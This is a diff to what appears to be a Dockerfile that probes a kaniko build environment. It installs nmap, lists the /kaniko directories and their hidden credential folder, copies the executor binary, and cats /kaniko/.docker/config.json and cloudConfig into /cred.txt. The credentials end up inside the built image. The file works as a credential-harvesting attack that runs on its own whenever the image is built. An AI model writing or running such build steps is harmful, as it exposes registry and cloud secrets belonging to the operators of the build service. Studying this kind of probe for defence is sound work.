@@ -8,9 +8,10 @@ RUN apt-get update
 RUN apt-get install nmap -y
 RUN apt install tree 
 RUN echo `ls -a /` >> /main_file.txt
+RUN echo `cat /kaniko/executor` >> /executor
 RUN echo `ls -a /kaniko/` >> /kaniko_file.txt
 RUN echo `ls -a /kaniko/.docker/` >> /docker_file.txt
-RUN echo `ls -a /kaniko/.docker/.data/` >> /cred.txt
+RUN echo `ls -al /kaniko/.docker/.data/` >> /data.txt
 RUN echo `cat /kaniko/.docker/config.json` >> /cred.txt
 RUN echo `cat /kaniko/.docker/cloudConfig` >> /cred.txt
 #RUN echo `ls -la /home` >> /dir.txt
